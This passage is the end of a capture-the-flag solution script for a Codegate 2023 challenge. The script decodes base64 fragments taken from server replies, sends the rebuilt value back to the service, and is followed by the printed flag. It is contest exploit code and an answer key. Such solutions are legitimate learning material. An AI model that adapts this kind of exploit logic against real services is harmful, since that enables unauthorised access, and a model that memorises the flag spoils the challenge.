    enc.append(res[2:-2])
print(enc)
e = b""

for i in range(len(enc)-1):
    print(enc[i][:len(enc[i])//2])
    e += b64decode(enc[i][:len(enc[i])//2]+b'==')
e += b64decode(enc[-1])
p.sendlineafter(b'>','2')
p.sendlineafter(b'> ',b64encode(e).decode())
p.interactive()
```
`codegate2023{68aeb23b86f64549bcd8ca414cd93a8d1de108da959d645952edc56c2c85d3702e0e36b9dd35f0f09a92ae97e0b785daec}`
